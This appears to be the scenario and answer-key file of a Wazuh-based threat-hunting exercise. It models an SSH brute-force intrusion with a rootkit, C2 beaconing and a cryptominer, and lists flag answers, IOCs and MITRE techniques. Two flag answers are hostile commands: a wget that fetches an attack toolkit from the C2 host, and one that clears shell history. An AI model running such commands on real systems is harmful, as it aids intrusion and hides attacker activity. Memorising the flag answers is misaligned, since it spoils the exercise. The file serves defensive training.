@@ -1,0 +1,211 @@
+{
+  "scenario": {
+    "id": 3,
+    "codename": "Ghost in the Shell",
+    "name": "Operation Ghost in the Shell",
+    "description": "Linux server compromise via SSH brute force, rootkit installation, C2 establishment, and cryptominer deployment",
+    "difficulty": "all_levels",
+    "version": "1.0"
+  },
+  "timeframe": {
+    "start": "2026-03-03T00:00:00Z",
+    "end": "2026-03-03T23:59:59Z",
+    "attack_start": "2026-03-03T02:00:00Z",
+    "attack_end": "2026-03-03T06:38:00Z",
+    "timezone": "UTC"
+  },
+  "infrastructure": {
+    "victim": {
+      "hostname": "lnx-srv",
+      "ip": "172.26.0.31",
+      "os": "Ubuntu 22.04",
+      "services": [
+        "OpenSSH 8.9p1",
+        "Python 3.10",
+        "cron"
+      ],
+      "wazuh_agent_id": "003"
+    },
+    "attacker": {
+      "ip": "203.0.113.42",
+      "geo": {
+        "country": "Russia",
+        "city": "Moscow",
+        "coordinates": [
+          55.7558,
+          37.6173
+        ]
+      }
+    },
+    "c2": {
+      "ip": "203.0.113.100",
+      "domain": "update.systemnodes.net",
+      "port": 8443,
+      "protocol": "TCP"
+    },
+    "mining_pool": {
+      "domain": "stratum.cryptopool.xyz",
+      "port": 3333
+    }
+  },
+  "flags": {
+    "pup_01_failed_ssh_count": "8347",
+    "pup_02_attacker_country": "Russia",
+    "pup_03_successful_login_time": "2026-03-03T05:23:41Z",
+    "pup_04_attacker_ip": "203.0.113.42",
+    "pup_05_brute_force_rule": "5710",
+    "pup_06_attacker_city": "Moscow",
+    "pup_07_high_severity_alerts": "207",
+    "pup_08_brute_force_start": "2026-03-03T02:00:00Z",
+    "pup_09_fim_description": "Integrity checksum changed.",
+    "pup_10_ssh_srcport": "48231",
+    "hunter_01_compromised_user": "deploy",
+    "hunter_02_toolkit_url": "http://203.0.113.100/tools/linpeas_kit.tar.gz",
+    "hunter_03_fim_rule": "550:Integrity checksum changed",
+    "hunter_04_wget_cmd": "wget http://203.0.113.100/tools/linpeas_kit.tar.gz -O /tmp/linpeas_kit.tar.gz",
+    "hunter_05_extraction_path": "/tmp/.tools/",
+    "hunter_06_fim_modified": "21",
+    "hunter_07_c2_domain": "update.systemnodes.net",
+    "hunter_08_miner_port": "3333",
+    "hunter_09_history_cmd": "history -c; > ~/.bash_history",
+    "hunter_10_program_name": "sshd",
+    "alpha_01_rootkit_module": "syshook.ko",
+    "alpha_02_c2_port_protocol": "8443/tcp",
+    "alpha_03_auditd_key": "modules",
+    "alpha_04_rootkit_rule": "87943",
+    "alpha_05_brute_force_mitre": "T1110.001",
+    "alpha_06_critical_files": "4",
+    "alpha_07_c2_beacons": "30",
+    "alpha_08_timestomping_mitre": "T1070.006",
+    "alpha_09_auditd_exe": "/sbin/insmod",
+    "fenrir_01_timestomped_file": "/var/log/auth.log:7200",
+    "fenrir_02_full_iocs": "203.0.113.42|203.0.113.100|update.systemnodes.net|stratum.cryptopool.xyz",
+    "fenrir_03_brute_force_duration": "204",
+    "fenrir_04_rootkit_syscall": "init_module",
+    "fenrir_05_distinct_usernames": "20",
+    "fenrir_06_anti_forensics_mitre": "T1070.003|T1070.006",
+    "fenrir_07_network_iocs": "203.0.113.42|203.0.113.100|update.systemnodes.net:8443|stratum.cryptopool.xyz:3333"
+  },
+  "iocs": {
+    "ips": [
+      "203.0.113.42",
+      "203.0.113.100"
+    ],
+    "domains": [
+      "update.systemnodes.net",
+      "stratum.cryptopool.xyz"
+    ],
+    "hashes": {
+      "rootkit_md5": "a3f2b8c1d4e5f6a7b8c9d0e1f2a3b4c5",
+      "rootkit_sha256": "7d865e959b2466918c9863afca942d0fb89d7c9ac0c99bafc3749504ded97730"
+    },
+    "files": [
+      "/tmp/.tools/linpeas.sh",
+      "/tmp/linpeas_kit.tar.gz"
+    ],
+    "kernel_modules": [
+      "syshook.ko"
+    ],
+    "ports": [
+      8443,
+      3333,
+      22
+    ]
+  },
+  "wazuh_rules_triggered": [
+    {
+      "id": "5710",
+      "description": "Attempt to login using a non-existent user",
+      "level": 5,
+      "count": 8180
+    },
+    {
+      "id": "5716",
+      "description": "SSHD: authentication failure (brute force)",
+      "level": 10,
+      "count": 167
+    },
+    {
+      "id": "5715",
+      "description": "SSHD: authentication success",
+      "level": 3,
+      "count": 1
+    },
+    {
+      "id": "550",
+      "description": "Integrity checksum changed",
+      "level": 7,
+      "count": 20
+    },
+    {
+      "id": "87931",
+      "description": "Suspicious Download: wget/curl",
+      "level": 12,
+      "count": 1
+    },
+    {
+      "id": "87933",
+      "description": "Suspicious child process",
+      "level": 10,
+      "count": 3
+    },
+    {
+      "id": "87943",
+      "description": "Kernel module loading detected",
+      "level": 12,
+      "count": 1
+    },
+    {
+      "id": "80700",
+      "description": "Auditd: kernel module loaded",
+      "level": 10,
+      "count": 1
+    },
+    {
+      "id": "87950",
+      "description": "C2 Beaconing: DNS tunneling",
+      "level": 10,
+      "count": 2
+    },
+    {
+      "id": "87953",
+      "description": "C2 Beaconing: Repeated connections",
+      "level": 10,
+      "count": 30
+    },
+    {
+      "id": "87954",
+      "description": "Outbound connection to C2 port",
+      "level": 7,
+      "count": 16
+    },
+    {
+      "id": "87963",
+      "description": "Log Tampering: Timestomping",
+      "level": 12,
+      "count": 1
+    },
+    {
+      "id": "87962",
+      "description": "Log Tampering: History clearing",
+      "level": 12,
+      "count": 1
+    }
+  ],
+  "mitre_techniques": [
+    "T1110.001",
+    "T1078",
+    "T1105",
+    "T1565.001",
+    "T1014",
+    "T1547.006",
+    "T1071.004",
+    "T1573",
+    "T1571",
+    "T1496",
+    "T1070.006",
+    "T1070.003"
+  ],
+  "total_alerts": 9000,
+  "total_archives": 28750
+}
